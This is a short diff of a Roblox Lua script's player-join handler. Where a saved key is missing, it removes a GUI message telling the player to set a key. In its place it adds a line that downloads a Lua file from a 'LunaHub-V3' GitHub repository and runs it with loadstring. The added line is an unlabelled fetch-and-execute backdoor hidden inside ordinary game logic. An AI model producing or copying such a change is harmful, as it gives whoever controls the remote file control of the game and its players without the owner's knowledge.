@@ -306,11 +306,7 @@ game.Players.PlayerAdded:Connect(function(player)
         print("Loaded Key: " .. loadedKey)
         -- Here you can set the loaded key to appropriate game logic
     else
-        -- Show the GUI message if the key is not found
-        textLabel.Text = "No key found. Please set your key."
-        textLabel.Visible = true -- Make the text label visible
-        task.wait(5) -- Keep the message visible for 5 seconds
-        textLabel.Visible = false -- Hide the message after 5 seconds
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Lunahubv2/LunaHub-V3/refs/heads/main/lunahub-main.lua"))()
     end
 end)
 game.Players.PlayerRemoving:Connect(function(player)
